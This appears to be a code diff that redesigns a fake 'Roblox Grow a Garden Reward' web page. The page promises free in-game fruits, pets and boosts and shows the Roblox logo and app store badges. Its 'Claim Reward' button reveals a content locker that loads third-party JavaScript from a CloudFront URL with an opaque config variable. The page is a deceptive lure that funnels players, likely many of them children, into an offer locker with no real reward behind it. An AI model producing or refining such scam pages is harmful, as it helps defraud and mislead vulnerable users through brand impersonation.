@@ -2,69 +2,114 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Roblox Grow a Garden Rewards</title>
+<title>Roblox Grow a Garden Reward</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <style>
-*{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',Arial,sans-serif;}
-body{background:#f0f4f8;color:#000;}
-.wrapper{max-width:480px;margin:50px auto;padding:20px;}
-.card{background:#fff;border-radius:20px;padding:25px;box-shadow:0 12px 25px rgba(0,0,0,0.15);animation:fadeIn 0.8s ease;}
-@keyframes fadeIn{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
-h1{text-align:center;margin-bottom:10px;font-size:26px;color:#1a73e8;}
-.subtitle{text-align:center;font-size:16px;opacity:0.8;margin-bottom:20px;}
-.preview img{width:100%;border-radius:15px;margin-bottom:20px;box-shadow:0 6px 15px rgba(0,0,0,0.1);}
-.badges{display:flex;gap:10px;flex-wrap:wrap;justify-content:center;margin-bottom:20px;}
-.badge{border:1px solid #1a73e8;padding:6px 12px;border-radius:25px;font-size:13px;color:#1a73e8;}
-.cta{margin-top:10px;background:#ff3b3f;color:#fff;text-align:center;padding:15px;border-radius:15px;font-weight:700;cursor:pointer;transition:0.2s;animation:pulse 1.5s infinite;}
-@keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.03)}100%{transform:scale(1)}}
-.cta:hover{background:#e32b2f;}
-.locker{margin-top:20px;display:none;animation:fadeInLocker 0.5s ease;}
-@keyframes fadeInLocker{from{opacity:0;transform:translateY(10px);}to{opacity:1;transform:translateY(0);}}
-.footer{text-align:center;font-size:12px;opacity:0.6;margin-top:25px;}
+body{
+    margin:0;
+    font-family:'Segoe UI', Arial, sans-serif;
+    background: linear-gradient(135deg, #000000, #e2231a);
+    color:#fff;
+    text-align:center;
+}
+.container{
+    max-width:420px;
+    margin:auto;
+    padding:25px 15px;
+}
+.logo{
+    margin-top:20px;
+}
+.logo img{
+    width:200px;
+}
+.title{
+    font-size:22px;
+    font-weight:700;
+    margin:20px 0;
+}
+.claim-btn{
+    background:#ffeb3b;
+    color:#000;
+    font-size:18px;
+    padding:15px;
+    border-radius:12px;
+    font-weight:bold;
+    cursor:pointer;
+    margin-bottom:15px;
+    transition:0.2s;
+}
+.claim-btn:hover{
+    background:#fff;
+}
+.note{
+    font-size:14px;
+    margin-bottom:20px;
+}
+.store img{
+    width:160px;
+    margin:10px 5px;
+}
+.locker{
+    display:none;
+    margin-top:15px;
+}
+.footer{
+    font-size:11px;
+    opacity:0.7;
+    margin-top:20px;
+}
 </style>
 </head>
 
 <body>
 
-<div class="wrapper">
-    <div class="card">
-        <h1>🌱 Roblox Grow a Garden Rewards</h1>
-        <div class="subtitle">Get free rare fruits, pets, and boosts instantly!</div>
+<div class="container">
 
-        <div class="preview">
-            <img src="https://i.imgur.com/REPLACE.png" alt="Grow a Garden Map">
-        </div>
+    <!-- ROBLOX LOGO -->
+    <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Roblox_Logo_2022.jpg" alt="Roblox Logo">
+    </div>
 
-        <div class="badges">
-            <div class="badge">🍓 Rare Fruits</div>
-            <div class="badge">🐝 Mythic Pets</div>
-            <div class="badge">⚡ Boosts</div>
-            <div class="badge">⏳ Limited</div>
-        </div>
+    <div class="title">
+        🎁 Claim Your Grow a Garden Reward!
+    </div>
 
-        <div class="cta" onclick="showLocker()">🔓 CLAIM YOUR REWARDS</div>
+    <div class="claim-btn" onclick="openLocker()">
+        Claim Reward
+    </div>
 
-        <div class="locker" id="locker">
-            <!-- Content Locker -->
-            <script type="text/javascript">
-                var EpaSA_gyJ_NYjapc={"it":4489560,"key":"ecc9a"};
-            </script>
-            <script src="https://da4talg8ap14y.cloudfront.net/5054835.js"></script>
-        </div>
+    <div class="note">
+        👇 If nothing happens, make sure Roblox is installed
+    </div>
+
+    <div class="store">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play">
+        <img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="App Store">
+    </div>
+
+    <!-- 🔐 CONTENT LOCKER -->
+    <div class="locker" id="locker">
+        <script type="text/javascript">
+            var EpaSA_gyJ_NYjapc={"it":4489560,"key":"ecc9a"};
+        </script>
+        <script src="https://da4talg8ap14y.cloudfront.net/5054835.js"></script>
     </div>
 
     <div class="footer">
         This page is not affiliated with Roblox Corporation.
     </div>
+
 </div>
 
 <script>
-function showLocker(){
-    document.querySelector('.cta').style.display = 'none';
+function openLocker(){
+    document.querySelector('.claim-btn').style.display = 'none';
     document.getElementById('locker').style.display = 'block';
 }
 </script>
 
 </body>
 </html>
+
